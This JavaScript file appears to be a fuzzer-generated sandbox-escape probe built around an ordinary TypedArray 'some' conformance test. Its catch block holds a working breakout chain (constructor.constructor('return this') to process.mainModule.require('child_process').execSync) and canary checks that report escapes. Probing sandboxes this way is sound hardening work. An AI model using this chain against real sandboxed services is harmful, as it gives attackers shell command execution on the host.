try {
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA([
            7,
            8
        ]);
        var results = [];
        sample.foo = 42;
        sample[Symbol('1')] = 43;
        sample.some(function () {
            results.push(arguments);
        });
        assert.sameValue(results.length, 2, 'results.length');
        assert.sameValue(results[0][1], 0, 'results[0][1] - key');
        assert.sameValue(results[1][1], 1, 'results[1][1] - key');
        assert.sameValue(results[0][0], 7, 'results[0][0] - value');
        assert.sameValue(results[1][0], 8, 'results[1][0] - value');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}